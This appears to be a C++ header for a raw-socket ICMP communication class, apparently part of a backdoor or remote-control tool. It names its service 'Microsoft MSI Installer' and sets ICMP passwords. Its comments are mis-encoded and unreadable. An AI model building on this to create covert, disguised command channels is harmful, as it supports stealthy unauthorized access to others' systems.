#ifndef _ICMP_H_
#define _ICMP_H

#pragma once
#include <winsock2.h>
#include <stdio.h>
#include <conio.h>
#include <stdlib.h>
#pragma comment(lib,"ws2_32.lib")

#define STATUS_FAILED 0xFFFF
#define MAX_PACKET 1024*60
#define xmalloc(s) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (s))
#define xfree(s) HeapFree(GetProcessHeap(), 0, (s))
#define SERVER_NAME "Microsoft MSI Installer"
#define ICMP_PASSWORD 3219 //Edit with the following
#define ICMP_REVERSE_PASSWORD 9123 //Edit with the above

/* The IP header */
typedef struct iphdr {
	unsigned int h_len:4; //4λ�ײ�����
	unsigned int version:4; //IP�汾�ţ�4��ʾIPV4
	unsigned char tos; //8λ��������TOS
	unsigned short total_len; //16λ�ܳ��ȣ��ֽڣ�
	unsigned short ident; //16λ��ʶ
	unsigned short frag_and_flags; //3λ��־λ
	unsigned char ttl; //8λ����ʱ�� TTL
	unsigned char proto; //8λЭ�� (TCP, UDP ������)
	unsigned short checksum; //16λIP�ײ�У���
	unsigned int sourceIP; //32λԴIP��ַ
	unsigned int destIP; //32λĿ��IP��ַ
}IpHeader;

//����ICMP�ײ�
typedef struct _ihdr 
{
	BYTE i_type; //8λ����
	BYTE i_code; //8λ����
	USHORT i_cksum; //16λУ��� 
	USHORT i_id; //ʶ��ţ�һ���ý��̺���Ϊʶ��ţ�
	USHORT i_seq; //�������к� 
	ULONG timestamp; //ʱ���
}IcmpHeader;

class ICMP_CONTROL
{
public:
	ICMP_CONTROL();
	~ICMP_CONTROL();
	void SetTimeOut(int type,int timeout);//type:0->SEND, 1->RECV
	int GetTimeOut(int type);//type:0->SEND, 1->RECV
	void socket(const char*ip);
	bool send(const char*buffer,long buflen=0);
	char *recvbuf;bool recv(void);char arg[MAX_PACKET];long argSizeRecv;
	bool OutputString;
private:
	bool recv1(void);
	WSADATA wsaData;
	struct sockaddr_in dest,from;
	int datasize;
	int fromlen;
	char *icmp_data;
	SOCKET sockRaw;
	int recvtimeout,sendtimeout;
	char ipaddress[512];
	inline USHORT checksum(USHORT *buffer, int size)
	{
		unsigned long cksum=0;
		while(size > 1)
		{
			cksum+=*buffer++;
			size-=sizeof(USHORT);
		}
		if(size)
		{
			cksum+=*(UCHAR *)buffer;
		}
		cksum=(cksum >> 16) + (cksum & 0xffff);
		cksum+=(cksum >> 16);
		return(USHORT) (~cksum);
}
};









#endif